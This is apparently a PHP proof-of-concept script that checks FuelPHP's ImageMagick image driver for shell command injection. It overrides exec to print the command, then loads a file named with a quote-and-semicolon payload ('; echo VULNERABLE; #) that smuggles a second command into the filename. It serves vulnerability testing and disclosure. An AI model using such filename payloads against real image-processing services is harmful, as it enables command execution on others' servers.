<?php
require 'repro/bootstrap_simple.php';

echo "Testing Command Injection...\n";

class Test_Image_Imagemagick extends \Fuel\Core\Image_Imagemagick {
    // Override exec to capture the command
    protected function exec($program, $params, $passthru = false) {
        $full_command = $program . ' ' . $params;
        echo "EXEC: " . $full_command . "\n";
        return array("100 100"); // Dummy output for identify
    }
}

try {
    $config = array(
        'driver' => 'imagemagick',
        'imagemagick_dir' => '/usr/bin/',
        'temp_dir' => '/tmp/',
        'temp_append' => 'img',
        'debug' => true,
    );

    $img = new Test_Image_Imagemagick($config);

    // Malicious filename
    $malicious_filename = "pwned.png'; echo VULNERABLE; #.png";
    touch($malicious_filename);

    echo "Loading file: $malicious_filename\n";
    $img->load($malicious_filename);

    unlink($malicious_filename);

} catch (\Exception $e) {
    echo "Exception: " . $e->getMessage() . "\n";
}
